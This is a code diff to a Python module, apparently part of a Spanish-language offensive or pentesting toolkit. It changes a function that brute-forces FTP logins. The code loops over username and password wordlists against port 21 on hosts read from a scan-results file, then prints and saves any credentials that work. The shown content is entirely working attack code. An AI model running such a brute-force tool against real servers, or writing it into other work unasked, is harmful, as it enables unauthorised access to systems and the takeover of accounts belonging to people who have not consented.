@@ -1,10 +1,11 @@
 import os
 import json
-import ftplib
+from ftplib import FTP
 
 FTP_RESULTS_DIR = "results/ftp"
 WORDLIST_USER = "wordlists/users.txt"
 WORDLIST_PASS = "wordlists/passwords.txt"
+SCAN_RESULTS_FILE = "results/scan_results.json"
 
 def fuerza_bruta_ftp(ip, port=21):
     os.makedirs(FTP_RESULTS_DIR, exist_ok=True)
@@ -16,7 +17,6 @@ def fuerza_bruta_ftp(ip, port=21):
 
     with open(WORDLIST_USER, "r") as f:
         usuarios = [line.strip() for line in f if line.strip()]
-
     with open(WORDLIST_PASS, "r") as f:
         contrasenas = [line.strip() for line in f if line.strip()]
 
@@ -25,28 +25,31 @@ def fuerza_bruta_ftp(ip, port=21):
     for usuario in usuarios:
         for contrasena in contrasenas:
             try:
-                ftp = ftplib.FTP()
-                ftp.connect(ip, port, timeout=5)
+                ftp = FTP()
+                ftp.connect(ip, port, timeout=3)
                 ftp.login(usuario, contrasena)
                 print(f"[+] Credenciales válidas encontradas: {usuario}:{contrasena}")
                 resultados["valid_credentials"].append({"usuario": usuario, "password": contrasena})
                 ftp.quit()
-            except ftplib.error_perm:
-                continue
             except Exception:
                 continue
 
-    ruta_salida = os.path.join(FTP_RESULTS_DIR, f"ftp_{ip}_bruteforce.json")
-    with open(ruta_salida, "w") as f:
+    salida = os.path.join(FTP_RESULTS_DIR, f"ftp_{ip}_bruteforce.json")
+    with open(salida, "w") as f:
         json.dump(resultados, f, indent=4)
 
-    print(f"[+] Resultados guardados en {ruta_salida}")
+    print(f"[+] Resultados guardados en {salida}")
     return resultados
 
 def run_ftp_attack():
-    from utils.common import cargar_hosts
-    hosts = cargar_hosts()
-    for host in hosts:
+    if not os.path.exists(SCAN_RESULTS_FILE):
+        print(f"[!] Archivo de escaneo no encontrado: {SCAN_RESULTS_FILE}")
+        return
+
+    with open(SCAN_RESULTS_FILE, "r") as f:
+        data = json.load(f)
+
+    for host in data.get("hosts", []):
         ip = host.get("ip")
         for port_info in host.get("open_ports", []):
             if port_info.get("port") == 21:
